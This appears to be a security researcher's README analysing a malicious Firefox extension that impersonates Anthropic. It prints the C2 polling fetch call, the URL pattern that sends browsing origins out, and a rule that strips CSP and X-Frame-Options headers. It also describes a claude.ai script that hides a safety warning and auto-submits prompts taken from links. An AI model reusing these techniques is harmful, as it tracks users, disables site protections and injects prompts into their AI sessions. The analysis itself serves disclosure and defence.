# Default Search with Anthropic (Firefox) — malicious update analysis

*[Versión en español](README.es.md)*

A Firefox extension published on addons.mozilla.org under the name **Default Search with Anthropic**
shipped a malicious payload in version **2.1.9**. The extension is signed by Mozilla, declares
`data_collection_permissions: ["none"]`, and at the time of writing is still the version served to
new installs.

The payload was not present at install time. It arrived through an automatic update twelve days after
a clean installation. Earlier community feedback on the listing flags the extension as unofficial and
as impersonating Anthropic, but no public write-up describes the behaviour documented here.

This repository contains the analysis, the indicators, and the sample.

| | |
|---|---|
| Listing name | Default Search with Anthropic |
| Manifest name | Claude Search |
| Extension ID | `{2dcb0f8a-f9de-4b46-899b-e11f8efc92f4}` |
| Affected version | 2.1.9 (manifest v3) |
| AMO listing | `addons.mozilla.org/en-US/firefox/addon/default-claude-ai/` |
| Package | `/firefox/downloads/file/4946688/default_claude_ai-2.1.9.xpi` |
| Signature state | Signed by Mozilla (`signedState: 2`) |
| Declared data collection | `["none"]` |
| SHA-256 (.xpi) | `dffd082ebeed92bf05a17cd05061198d5e6822b2179eb8c5d8fc1612eb526946` |

## Version history

AMO reports three published versions. The jump in package size on 2026-08-08, published the same day
as 2.1.6 and skipping 2.1.7 and 2.1.8, corresponds to the added code.

| Version | Released | Size |
|---|---|---|
| 2.1.5 | 2026-06-15 | 76.11 KB |
| 2.1.6 | 2026-08-08 | 76.12 KB |
| 2.1.9 | 2026-08-08 | **80.34 KB** |

## Timeline on the analysed host

All times UTC.

| Timestamp | Event |
|---|---|
| 2026-07-28 14:46:34 | Installed from the AMO listing. Clean build. |
| 2026-08-09 22:44:16 | Automatic update to 2.1.9. C2 cookies created in the same second. |
| 2026-08-09 → 09-15 | 36 days of operation, polling every 8 minutes while the browser was running. |
| 2026-09-15 01:34:15 | Last recorded C2 contact. |
| 2026-09-15 01:34:40 | Extension removed. |

The `ts` cookie set by the C2 was rewritten on every poll. It stopped 25 seconds before removal and
was never updated again, which independently confirms the beacon died with the uninstall.

## Behaviour

### 1. Remote configuration channel

Every 8 minutes the extension fetches its configuration through a link shortener:

```js
fetch('https://bit.ly/release_note_for_claude', { credentials: 'include', cache: 'no-store' })
    → 301 → https://stable-channel.zeabur.app/?j=release_note
```

`credentials: 'include'` is not needed to retrieve a configuration blob. It lets the server set a
cookie on first contact and recognise the same installation on every subsequent poll, which makes it
a persistent victim identifier. The shortener adds a layer of indirection so the operator can move
the endpoint without shipping an update.

The response defines two attacker-controlled fields: `u` (a destination URL) and `h` (a list of
response headers to strip). The package ships decoy values; the operative values only ever arrive
over this channel, out of reach of store review.

```
Decoy shipped in the package:
  h: ["x-claude-omnibox-hint", "etag-search-claude"]
  u: "https://claude.ai/"

Values actually received from the C2:
  h: ["content-security-policy", "x-frame-options"]
  u: "https://kmn6d3go6kuodubmfoiawcstl40ukbqb.lambda-url.us-west-2.on.aws/"
```

### 2. Browsing profile exfiltration

For every origin visited three or more times, with a five-minute per-origin cooldown, the extension
appends a hidden 0×0 iframe pointing at the configured destination and passes the origin base64-encoded:

```
https://<destination>/?r=searchContextWarmup&i=MGNsYXU=&u=<base64(origin)>
                                             ^ campaign identifier, decodes to "0clau"
```

Only the origin is transmitted, not the full URL. The server additionally receives the client IP, the
user agent, and the identifying cookie.

The design points at real-time targeting rather than bulk collection: the origin is not batched for
later upload, it is sent as a parameter of a request whose response is immediately loaded, which lets
the server decide what to return per site. The three-visit threshold discards casual browsing and
retains only regularly used services, and the cooldown deliberately caps volume.

Because these requests originate from the extension's background page rather than a tab, they leave
no entry in browsing history.

### 3. Browser-wide removal of security headers

From the `h` field the extension registers a dynamic `declarativeNetRequest` rule that strips the
listed headers from every response loaded in a nested frame, on any site:

```
id: 17391, priority: 1
action:    { type: 'modifyHeaders', responseHeaders: [
             { header: 'content-security-policy', operation: 'remove' },
             { header: 'x-frame-options',         operation: 'remove' } ] }
condition: { urlFilter: '*', resourceTypes: ['sub_frame'] }
```

This is the widest-reaching effect. For as long as the extension is installed, framing protection is
disabled for every site the user visits, regardless of what each site configures.

### 4. claude.ai interface manipulation

The only content script runs exclusively on `claude.ai` and performs two chained actions:

1. It locates and removes the safety notice *"Use caution before running this prompt"* from the DOM,
   keeping a `MutationObserver` active for 60 seconds to suppress it if it reappears.
2. It reads the `?q=` URL parameter, writes it into the composer and clicks the send button.

Combined, any `claude.ai/new?q=<text>` link becomes an instruction that executes on its own inside the
user's authenticated session, with the safety warning removed from the screen before it can be read.

## Capability boundaries

The manifest was audited permission by permission. The extension does **not** request:

```
cookies    webRequest    history      bookmarks
downloads  nativeMessaging   scripting    proxy
```

Consequently it cannot read cookies or credentials, cannot read the content of visited pages (its only
content script is scoped to a single domain), and cannot read framed sites — stripping the headers
permits *framing*, not *reading*, since the same-origin policy still applies. No credential rotation is
warranted by this artefact alone.

Granted permissions are `storage`, `declarativeNetRequest`, `contextMenus`, `tabs`, `clipboardWrite`,
with host permissions `https://claude.ai/*`, `*://*/*` and `<all_urls>`. Neither `tabs` combined with
`<all_urls>` nor `declarativeNetRequest` is required by the declared functionality.

## Are you affected

Check `about:support` → Extensions, or the profile directory:

```sh
grep -rl '2dcb0f8a-f9de-4b46-899b-e11f8efc92f4' ~/.mozilla/firefox/*/extensions.json
```

On Firefox builds that follow XDG paths the profile lives under `~/.config/mozilla/firefox/` instead.

If present, remove it from `about:addons`. Removing the extension also purges its dynamic
`declarativeNetRequest` rules, which restores the stripped headers. Verify that
`<profile>/extension-dnr/` is empty afterwards.

Then delete the residual cookies, which survive the uninstall:

```
.bit.ly                     _bit
stable-channel.zeabur.app   v, ts
```

They are inert once the extension is gone — nothing remains to transmit them — but they identify the
host to the operator's infrastructure on any future contact.

## Contents

```
IOCS.md                        indicators, copy-paste friendly
analysis/code-walkthrough.md   annotated source of the malicious blocks
samples/                       signed package and extracted sources, with hashes
scripts/                       helper to verify no host data leaks into a commit
```

## Disclosure

Reported to Mozilla (AMO), Anthropic (brand impersonation and suppression of an in-product safety
notice), AWS (Lambda Function URL) and Zeabur (configuration host).

No coordinated-disclosure embargo applies. This is active malware rather than a vulnerability: the
operator already knows what their own code does, and withholding the detail only prolongs exposure
for users who still have it installed.

## Notes

Findings describe observed behaviour of the published package. Nothing here asserts the identity or
intent of any individual. Every claim can be reproduced from the sample and hashes in this repository.

## License

Documentation and analysis released under [CC BY 4.0](LICENSE). The sample in `samples/` is included
for research and is not covered by that license.
